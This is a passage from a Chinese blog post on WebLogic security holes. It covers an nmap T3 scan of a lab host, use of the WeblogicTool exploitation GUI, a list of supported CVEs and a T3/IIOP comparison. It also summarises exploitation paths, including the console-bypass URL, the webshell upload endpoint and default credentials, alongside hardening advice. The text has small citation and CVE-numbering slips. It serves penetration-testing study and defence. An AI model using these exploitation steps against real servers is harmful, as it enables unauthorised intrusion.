<li><strong>网络隔离</strong>：限制 WebLogic 管理端口（7001）的访问范围，避免暴露于公网。  </li>
<li><strong>升级 JDK</strong>：使用 JDK 11+ 版本以限制 JNDI 远程类加载能力 。</li>
</ol>
<hr>
<h4 id="5-总结与启示"><a href="#5-总结与启示" class="headerlink" title="5. 总结与启示"></a><strong>5. 总结与启示</strong></h4><p>CVE-2023-21839 的本质是 <strong>WebLogic 对 T3&#x2F;IIOP 协议的安全控制不足</strong>，结合 JNDI 注入机制实现远程代码执行。其危害性在于攻击链简单且无需身份验证，成为勒索软件和 APT 组织的重点目标。<br><strong>防御建议</strong>：  </p>
<ul>
<li>定期更新官方补丁，关注 Oracle 季度安全通告。  </li>
<li>强化协议管控，遵循最小化开放原则。  </li>
<li>部署入侵检测系统（IDS）监控异常 T3&#x2F;IIOP 流量（如高频 JNDI 请求）。</li>
</ul>
<h2 id="Weblogic综合利用"><a href="#Weblogic综合利用" class="headerlink" title="Weblogic综合利用"></a>Weblogic综合利用</h2><h3 id="1-中间件扫描，服务信息收集"><a href="#1-中间件扫描，服务信息收集" class="headerlink" title="1.中间件扫描，服务信息收集"></a>1.中间件扫描，服务信息收集</h3><ul>
<li>使用nmap扫描T3协议是否可用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap --script=weblogic-t3-info 192.168.100.137    </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-04 06:23 EDT</span><br><span class="line">Nmap scan report for 192.168.100.137</span><br><span class="line">Host is up (0.00012s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">7001/tcp open  afs3-callback</span><br><span class="line">|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)</span><br><span class="line">MAC Address: 00:0C:29:AD:B3:72 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-综合利用工具"><a href="#2-综合利用工具" class="headerlink" title="2.综合利用工具"></a>2.综合利用工具</h3><ul>
<li><p><strong>工具下载</strong></p>
<ul>
<li>就目前而言就这个工具最好用**<a target="_blank" rel="noopener" href="https://github.com/KimJun1010/WeblogicTool">WeblogicTool</a>**</li>
</ul>
</li>
<li><p><strong>利用示例</strong></p>
<ul>
<li>使用java启动工具GUI</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/weblogic_workplase]                                                           </span><br><span class="line">└─$ java -jar WeblogicTool_1<span class="number">.3</span>.jar                                                                                            </span><br><span class="line">四月 <span class="number">05</span>, <span class="number">2025</span> <span class="number">3</span>:<span class="number">11</span>:<span class="number">47</span> 下午 com.sun.javafx.css.parser.CSSParser declaration</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>协议探测</strong></p>
<ul>
<li>直接点击协议探测，探测时候开启T3或者IIOP。<ul>
<li>在地址栏下方输入想要探测的url即可。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250406032725417.png?x-oss-process=style/img-to-webp" alt="image-20250406032725417"></p>
</li>
<li><p><strong>漏洞检查</strong></p>
<ul>
<li>首先配置我们确定的<ul>
<li>Weblogic服务的url路径</li>
<li>漏洞检查选择ALL_ECHO直接扫描所有可用PoC</li>
<li>点击检查按钮</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250406032303678.png?x-oss-process=style/img-to-webp" alt="image-20250406032303678"></p>
<ul>
<li>检查完后可直接在界面上看到检查结果，例如此次显示CVE-2018-2894可用。</li>
</ul>
</li>
<li><p><strong>命令执行</strong></p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250406032934344.png?x-oss-process=style/img-to-webp" alt="image-20250406032934344"></p>
<ul>
<li>工具支持的CVE漏洞编号<ul>
<li>如果通过工具无法探测到可利用的Weblogic漏洞，可再通过nmap探测的Weblogic版本，在公开漏洞库中进行搜索，然后进行利用。</li>
</ul>
</li>
</ul>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CVE<span class="number">-2023</span><span class="number">-21931</span>（JNDI）</span><br><span class="line">CVE<span class="number">-2023</span><span class="number">-21839</span>（JNDI）</span><br><span class="line">CVE<span class="number">-2020</span><span class="number">-2551</span>（JRMP）</span><br><span class="line">CVE<span class="number">-2020</span><span class="number">-2551</span></span><br><span class="line">CVE<span class="number">-2020</span><span class="number">-2555</span></span><br><span class="line">CVE<span class="number">-2020</span><span class="number">-2883</span></span><br><span class="line">CVE<span class="number">-2020</span><span class="number">-14882</span> 未授权访问</span><br><span class="line">CVE<span class="number">-2018</span><span class="number">-2894</span></span><br><span class="line">CVE<span class="number">-2018</span><span class="number">-2628</span>（JRMP）</span><br><span class="line">CVE<span class="number">-2018</span><span class="number">-2893</span>（JRMP）</span><br><span class="line">CVE<span class="number">-2018</span><span class="number">-3245</span>（JRMP）</span><br><span class="line">CVE_2018_3252（JRMP）</span><br><span class="line">CVE_2018_3191</span><br><span class="line">CVE<span class="number">-2016</span><span class="number">-3510</span></span><br><span class="line">CVE<span class="number">-2016</span><span class="number">-0638</span></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-10271</span></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-3248</span>（JRMP）</span><br><span class="line">CVE<span class="number">-2015</span><span class="number">-4852</span></span><br></pre></td></tr></table></figure>

<h2 id="T3协议和IIOP协议对比"><a href="#T3协议和IIOP协议对比" class="headerlink" title="T3协议和IIOP协议对比"></a>T3协议和IIOP协议对比</h2><p>以下是 <strong>T3 协议</strong>与 <strong>IIOP 协议</strong>的对比分析，涵盖协议设计、功能特性、安全风险及适用场景等核心维度：</p>
<hr>
<h3 id="1-协议概述"><a href="#1-协议概述" class="headerlink" title="1. 协议概述"></a><strong>1. 协议概述</strong></h3><table>
<thead>
<tr>
<th><strong>维度</strong></th>
<th><strong>T3 协议</strong></th>
<th><strong>IIOP 协议</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>定义</strong></td>
<td>WebLogic <strong>私有协议</strong>，基于 Java RMI 优化，专为 WebLogic 集群通信设计。</td>
<td><strong>CORBA 标准协议</strong>（通用对象请求代理架构），支持跨语言、跨平台的分布式通信。</td>
</tr>
<tr>
<td><strong>核心目标</strong></td>
<td>提供高性能的 <strong>Java 对象传输</strong> 和集群管理功能。</td>
<td>实现 <strong>跨语言互操作性</strong>（如 Java、C++、Python 等）。</td>
</tr>
<tr>
<td><strong>依赖技术</strong></td>
<td>Java 序列化机制、WebLogic 私有扩展（如负载均衡、心跳检测）。</td>
<td>CORBA 的 GIOP（通用 Inter-ORB 协议）规范，结合 Java 序列化和 IDL（接口定义语言）。</td>
</tr>
</tbody></table>
<hr>
<h3 id="2-核心特性对比"><a href="#2-核心特性对比" class="headerlink" title="2. 核心特性对比"></a><strong>2. 核心特性对比</strong></h3><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>T3 协议</strong></th>
<th><strong>IIOP 协议</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>序列化机制</strong></td>
<td>基于 <strong>Java 原生序列化</strong>，支持复杂对象传输（如类、方法、状态）。</td>
<td>使用 <strong>CORBA 序列化</strong>（CDR 格式），需通过 IDL 定义接口，对非 Java 语言更友好。</td>
</tr>
<tr>
<td><strong>性能优化</strong></td>
<td>高度优化：<br>- 压缩传输数据<br>- 长连接复用<br>- 支持异步通信。</td>
<td>通用性强但性能较低：<br>- 数据包解析开销大<br>- 跨语言兼容性牺牲了效率。</td>
</tr>
<tr>
<td><strong>集群支持</strong></td>
<td>深度集成 WebLogic 集群功能：<br>- 自动故障转移<br>- 负载均衡<br>- 会话复制。</td>
<td>依赖 CORBA 的 ORB（对象请求代理）实现分布式通信，无原生集群管理能力。</td>
</tr>
<tr>
<td><strong>跨语言支持</strong></td>
<td><strong>仅限 Java</strong>（强绑定 JVM 生态）。</td>
<td><strong>支持多语言</strong>（通过 IDL 生成不同语言的客户端和服务端）。</td>
</tr>
</tbody></table>
<hr>
<h3 id="3-安全性对比"><a href="#3-安全性对比" class="headerlink" title="3. 安全性对比"></a><strong>3. 安全性对比</strong></h3><table>
<thead>
<tr>
<th><strong>维度</strong></th>
<th><strong>T3 协议</strong></th>
<th><strong>IIOP 协议</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>主要风险</strong></td>
<td><strong>反序列化漏洞高发</strong>（如 CVE-2018-2628）：<br>- 协议默认使用 Java 原生序列化，攻击者可构造恶意对象绕过黑名单。</td>
<td>风险较低但依然存在：<br>- CORBA 安全机制（如 CSIv2）可增强认证，但实现复杂易配置错误。</td>
</tr>
<tr>
<td><strong>加密支持</strong></td>
<td>支持 <strong>T3S</strong>（基于 SSL&#x2F;TLS 加密）。</td>
<td>支持 <strong>IIOPS</strong>（SSL 加密的 IIOP）。</td>
</tr>
<tr>
<td><strong>攻击面</strong></td>
<td>更广泛：<br>- WebLogic 默认开启 T3 端口（7001）且公网暴露风险高。</td>
<td>较窄：<br>- 多用于内部系统集成，公网暴露较少。</td>
</tr>
</tbody></table>
<hr>
<h3 id="4-典型漏洞案例"><a href="#4-典型漏洞案例" class="headerlink" title="4. 典型漏洞案例"></a><strong>4. 典型漏洞案例</strong></h3><table>
<thead>
<tr>
<th><strong>协议</strong></th>
<th><strong>漏洞示例</strong></th>
<th><strong>利用方式</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>T3</strong></td>
<td>CVE-2018-2628（反序列化漏洞）<br>CVE-2020-2883（补丁绕过）</td>
<td>发送恶意序列化数据，通过 <code>InvokerTransformer</code> 或 <code>UnicastRef</code> 链执行任意代码。</td>
</tr>
<tr>
<td><strong>IIOP</strong></td>
<td>CVE-2018-2893（反序列化漏洞）<br>CVE-2020-14825（权限绕过）</td>
<td>利用 IIOP 协议传输恶意 CORBA 对象，触发服务端反序列化或绕过权限控制。</td>
</tr>
</tbody></table>
<hr>
<h3 id="5-适用场景"><a href="#5-适用场景" class="headerlink" title="5. 适用场景"></a><strong>5. 适用场景</strong></h3><table>
<thead>
<tr>
<th><strong>场景</strong></th>
<th><strong>T3 协议</strong></th>
<th><strong>IIOP 协议</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>纯 Java 环境</strong></td>
<td><strong>首选</strong>：<br>- WebLogic 集群内部节点通信<br>- Java 客户端与服务器交互。</td>
<td>不推荐：<br>- 性能低于 T3，无额外优势。</td>
</tr>
<tr>
<td><strong>跨语言系统</strong></td>
<td>不可用：<br>- 仅支持 Java 生态。</td>
<td><strong>首选</strong>：<br>- 集成遗留 CORBA 系统（如 C++ 服务）<br>- 多语言微服务通信。</td>
</tr>
<tr>
<td><strong>高并发需求</strong></td>
<td><strong>更优</strong>：<br>- 长连接复用、数据压缩降低延迟。</td>
<td>较差：<br>- 协议解析和跨语言转换带来额外开销。</td>
</tr>
</tbody></table>
<hr>
<h3 id="6-配置与加固建议"><a href="#6-配置与加固建议" class="headerlink" title="6. 配置与加固建议"></a><strong>6. 配置与加固建议</strong></h3><table>
<thead>
<tr>
<th><strong>措施</strong></th>
<th><strong>T3 协议</strong></th>
<th><strong>IIOP 协议</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>禁用协议</strong></td>
<td>若非必要，关闭 T3 端口：<br><code>Admin Console → Server → Protocols → Disable T3</code></td>
<td>关闭 IIOP 端口：<br><code>Admin Console → Server → Protocols → Disable IIOP</code></td>
</tr>
<tr>
<td><strong>加密通信</strong></td>
<td>强制使用 <strong>T3S</strong> 替代 T3。</td>
<td>启用 <strong>IIOPS</strong> 并配置 SSL 证书。</td>
</tr>
<tr>
<td><strong>输入过滤</strong></td>
<td>拦截包含危险类的序列化数据（如 <code>org.apache.commons.collections.*</code>）。</td>
<td>限制 CORBA 接口的访问权限，校验 IDL 定义的数据格式。</td>
</tr>
</tbody></table>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><strong>T3 协议</strong>：专为 WebLogic 设计的高性能 Java 协议，<strong>反序列化漏洞高发</strong>，需严格限制公网暴露。  </li>
<li><strong>IIOP 协议</strong>：面向跨语言集成的标准协议，<strong>风险相对可控</strong>，但需注意 CORBA 安全配置。  </li>
<li><strong>共同防御重点</strong>：禁用非必要协议、启用加密传输、监控反序列化行为。</li>
</ul>
<h2 id="Weblogic漏洞总结"><a href="#Weblogic漏洞总结" class="headerlink" title="Weblogic漏洞总结"></a>Weblogic漏洞总结</h2><h3 id="XMLDecoder组件相关CVE"><a href="#XMLDecoder组件相关CVE" class="headerlink" title="XMLDecoder组件相关CVE"></a>XMLDecoder组件相关CVE</h3><h4 id="1-CVE-2017-3506-1"><a href="#1-CVE-2017-3506-1" class="headerlink" title="1. CVE-2017-3506"></a><strong>1. CVE-2017-3506</strong></h4><ul>
<li><strong>类型</strong>：XMLDecoder 反序列化漏洞（组件相关）</li>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0</li>
<li><strong>原理</strong>：<br>漏洞源于 WebLogic 的 WLS-WebServices 组件未对用户传入的 XML 数据进行过滤，攻击者可构造包含 <code>object</code> 标签的恶意 XML 数据，触发 <code>XMLDecoder</code> 反序列化执行任意命令。</li>
<li><strong>修复措施</strong>：<br>官方通过黑名单机制过滤 <code>object</code> 标签，但该补丁存在绕过可能。</li>
</ul>
<hr>
<h4 id="2-CVE-2017-10271-1"><a href="#2-CVE-2017-10271-1" class="headerlink" title="2. CVE-2017-10271"></a><strong>2. CVE-2017-10271</strong></h4><ul>
<li><strong>类型</strong>：XMLDecoder 反序列化补丁绕过漏洞</li>
<li><strong>影响版本</strong>：与 CVE-2017-3506 相同</li>
<li><strong>原理</strong>：<br>CVE-2017-3506 的补丁仅过滤了 <code>object</code> 标签，攻击者改用 <code>void</code>、<code>new</code>、<code>method</code> 等标签构造新的 XML 载荷，绕过黑名单限制，再次触发反序列化漏洞。</li>
<li><strong>利用路径</strong>：<br>通过 <code>/wls-wsat/CoordinatorPortType</code> 等接口发送恶意 SOAP 请求，执行命令或上传 WebShell。</li>
<li><strong>修复措施</strong>：<br>进一步扩展黑名单限制更多危险标签，并删除 <code>wls-wsat</code> 组件。</li>
</ul>
<hr>
<h4 id="3-CVE-2019-2725-1"><a href="#3-CVE-2019-2725-1" class="headerlink" title="3. CVE-2019-2725"></a><strong>3. CVE-2019-2725</strong></h4><ul>
<li><strong>类型</strong>：XMLDecoder 反序列化二次补丁绕过漏洞</li>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</li>
<li><strong>原理</strong>：<br>攻击者通过 <code>class</code> 属性构造特定 XML 节点（如 <code>&lt;array class=&quot;byte&quot;&gt;</code>），绕过 CVE-2017-10271 的补丁限制，再次触发反序列化漏洞48。</li>
<li><strong>关联协议</strong>：HTTP</li>
<li><strong>利用场景</strong>：<br>类似 CVE-2017-10271，但需构造更复杂的载荷绕过补丁检查。</li>
</ul>
<hr>
<h4 id="4-CVE-2019-2729"><a href="#4-CVE-2019-2729" class="headerlink" title="4. CVE-2019-2729"></a><strong>4. CVE-2019-2729</strong></h4><ul>
<li><strong>类型</strong>：XMLDecoder 反序列化漏洞（组件相关）</li>
<li><strong>影响版本</strong>：WebLogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</li>
<li><strong>原理</strong>：<br>攻击者通过 <code>AsyncResponseService</code> 组件的 HTTP 接口发送恶意 XML 数据，利用未过滤的反序列化路径执行命令，属于 CVE-2019-2725 的变种。</li>
<li><strong>修复措施</strong>：<br>彻底移除或禁用相关组件，并升级至安全版本。</li>
</ul>
<h3 id="WebLogic-其他常见漏洞分类总结"><a href="#WebLogic-其他常见漏洞分类总结" class="headerlink" title="WebLogic 其他常见漏洞分类总结"></a>WebLogic 其他常见漏洞分类总结</h3><h4 id="1-反序列化漏洞-1"><a href="#1-反序列化漏洞-1" class="headerlink" title="1. 反序列化漏洞"></a>1. <strong>反序列化漏洞</strong></h4><ul>
<li><strong>核心原因</strong>：WebLogic 在处理 T3&#x2F;IIOP 协议的反序列化数据时，未严格校验输入数据，导致恶意对象被解析并触发代码执行。</li>
<li><strong>典型漏洞</strong>：<ul>
<li><strong>CVE-2015-4852</strong>：首个公开的 WebLogic 反序列化漏洞，利用 Apache Commons Collections 链实现 RCE。</li>
<li><strong>CVE-2017-10271</strong>：通过 XMLDecoder 反序列化绕过补丁，触发远程代码执行。</li>
<li><strong>CVE-2019-2725</strong>：wls9-async 组件反序列化漏洞，影响 10.3.6.0 和 12.1.3.0 版本。</li>
<li><strong>CVE-2020-2551</strong>：基于 IIOP 协议的反序列化漏洞，利用 <code>JtaTransactionManager</code> 类绕过黑名单。</li>
</ul>
</li>
<li><strong>利用方式</strong>：构造恶意序列化数据，通过 T3&#x2F;IIOP 协议发送至目标端口（默认 7001）。</li>
</ul>
<h4 id="2-未授权访问-权限绕过"><a href="#2-未授权访问-权限绕过" class="headerlink" title="2. 未授权访问&#x2F;权限绕过"></a>2. <strong>未授权访问&#x2F;权限绕过</strong></h4><ul>
<li><strong>核心原因</strong>：身份验证逻辑缺陷或路径遍历漏洞，允许攻击者绕过登录验证直接访问敏感功能。</li>
<li><strong>典型漏洞</strong>：<ul>
<li><strong>CVE-2020-14882</strong>：未授权访问管理控制台，通过构造特殊 URL 绕过认证（如 <code>/console/css/%252e%252e%252fconsole.portal</code>）。<ul>
<li><strong>利用方式</strong>：直接访问隐藏接口或通过路径遍历访问受限功能（如部署 WAR 文件）。</li>
</ul>
</li>
<li><strong>CVE-2020-14883</strong>：权限提升漏洞，结合 CVE-2020-14883 实现未授权 RCE。</li>
</ul>
</li>
</ul>
<h4 id="3-文件上传漏洞"><a href="#3-文件上传漏洞" class="headerlink" title="3. 文件上传漏洞"></a>3. <strong>文件上传漏洞</strong></h4><ul>
<li><strong>核心原因</strong>：未对上传文件的路径、类型和权限进行校验，导致恶意文件被写入可执行目录。</li>
<li><strong>典型漏洞</strong>：<ul>
<li><strong>CVE-2018-2894</strong>：通过 <code>/ws_utc/config.do</code> 修改工作目录，上传 JSP Webshell 至 Web 路径。</li>
<li><strong>CVE-2020-14750</strong>：利用未授权上传配置文件导致代码执行。</li>
</ul>
</li>
<li><strong>利用方式</strong>：利用管理界面功能（如“安全”选项）上传恶意文件，并通过 HTTP 访问触发。</li>
</ul>
<h4 id="4-SSRF（服务器端请求伪造"><a href="#4-SSRF（服务器端请求伪造" class="headerlink" title="4. SSRF（服务器端请求伪造)"></a>4. <strong>SSRF（服务器端请求伪造)</strong></h4><ul>
<li><strong>核心原因</strong>：服务端未校验用户提供的 URL，允许攻击者探测内网或发起二次攻击。</li>
<li><strong>典型漏洞</strong>：<ul>
<li><strong>CVE-2014-4210</strong>：通过 <code>uddiexplorer/SearchPublicRegistries.jsp</code> 发起内网请求。</li>
</ul>
</li>
<li><strong>利用方式</strong>：构造恶意 URL 参数，利用 WebLogic 服务作为代理访问内部系统。</li>
</ul>
<h4 id="5-远程代码执行（RCE）"><a href="#5-远程代码执行（RCE）" class="headerlink" title="5. 远程代码执行（RCE）"></a>5. <strong>远程代码执行（RCE）</strong></h4><ul>
<li><strong>核心原因</strong>：多种漏洞组合利用（如反序列化 + 权限绕过）或直接代码注入。</li>
<li><strong>典型漏洞</strong>：<ul>
<li><strong>CVE-2019-2729</strong>：通过未授权接口触发远程代码执行。</li>
<li><strong>CVE-2020-14644</strong>：Coherence 组件的反序列化漏洞，通过 T3&#x2F;IIOP 触发。</li>
</ul>
</li>
<li><strong>利用方式</strong>：结合反序列化链或直接部署恶意应用（如 WAR 文件）。</li>
</ul>
<h4 id="6-配置错误"><a href="#6-配置错误" class="headerlink" title="6. 配置错误"></a>6. <strong>配置错误</strong></h4><ul>
<li><strong>核心原因</strong>：默认弱口令、未禁用高风险服务或开放敏感端口。</li>
<li><strong>典型问题</strong>：<ul>
<li><strong>默认凭据</strong>：<code>weblogic/weblogic123</code> 等弱口令未修改。</li>
<li><strong>T3&#x2F;IIOP 协议暴露</strong>：未限制协议访问，导致反序列化攻击面扩大。</li>
<li><strong>调试模式开启</strong>：生产环境中启用开发模式功能（如 Web 服务测试页）。</li>
</ul>
</li>
<li><strong>利用方式</strong>：暴力破解密码、利用未关闭的服务发起攻击。</li>
</ul>
<h4 id="7-信息泄露"><a href="#7-信息泄露" class="headerlink" title="7. 信息泄露"></a>7. <strong>信息泄露</strong></h4><ul>
<li><strong>核心原因</strong>：接口或日志暴露敏感信息（如版本号、配置详情）。</li>
<li><strong>典型漏洞</strong>：<ul>
<li><strong>CVE-2018-3252</strong>：通过错误页面泄露服务器路径信息。</li>
<li><strong>日志文件未保护</strong>：访问日志、配置文件未加密存储。</li>
</ul>
</li>
<li><strong>利用方式</strong>：通过错误信息或公开接口获取版本信息，辅助后续漏洞利用。</li>
</ul>
<hr>
<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a><strong>防御建议</strong></h3><ol>
<li><strong>及时更新补丁</strong>：关注 Oracle 季度关键补丁更新（CPU），修复已知漏洞。</li>
<li><strong>禁用高风险协议</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 修改 config.xml 禁用 T3 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">connection-filter</span>&gt;</span>t3 127.0.0.1 allow<span class="tag">&lt;/<span class="name">connection-filter</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>强化访问控制</strong>：<ul>
<li>限制管理控制台的访问 IP。</li>
<li>启用多因素认证（MFA）和强密码策略。</li>
</ul>
</li>
<li><strong>最小化服务暴露</strong>：<ul>
<li>关闭不必要的服务（如 IIOP）。</li>
<li>避免将 WebLogic 管理端口（7001）暴露在公网。</li>
</ul>
</li>
<li><strong>日志与监控</strong>：<ul>
<li>实时监控异常请求（如大量反序列化流量）。</li>
<li>定期审计日志文件（<code>access.log</code>、<code>server.log</code>）</li>
</ul>
</li>
</ol>
<h3 id="汇总归类"><a href="#汇总归类" class="headerlink" title="汇总归类"></a>汇总归类</h3><ul>
<li>不可出网利用<ul>
<li>基于HTTP协议XMLDecoder系列</li>
<li>基于HTTP协议未授权绕过RCE系列CVE-2020-14882&#x2F;CVE-2020-14883</li>
<li>基于文件上传的CVE-2018-2894</li>
<li>基于T3&#x2F;IIOP的CC链变种CVE-2020-2883</li>
</ul>
</li>
<li>可出网利用<ul>
<li>基于T3&#x2F;IIOP的JRMP注入 CVE-2018-2628</li>
<li>基于T3&#x2F;IIOP的JNDI注入 CVE-2023-21839</li>
</ul>
</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/avtor.png?x-oss-process=style/img-to-webp" title="头像" alt="头像"></a><div class="post-copyright__author_name">Takake</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://blog.takake.com/posts/64101/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://blog.takake.com/posts/64101/')">Weblogic常见安全漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/red_cross.png?x-oss-process=style/img-to-webp" alt="红十字会"/></a><div class="post-qr-code-desc">红十字会</div></li><li class="reward-item"><a href="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/logo.png?x-oss-process=style/img-to-webp" alt="LOGO"/></a><div class="post-qr-code-desc">LOGO</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://blog.takake.com/posts/64101/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Weblogic常见安全漏洞&amp;url=https://blog.takake.com/posts/64101/&amp;pic=https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.takake.com" target="_blank">高木のBlog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>漏洞复现<span class="tagsPageCount">22</span></a><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">22</span></a><a class="post-meta__box__tags" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"><span class="tags-punctuation"> <i 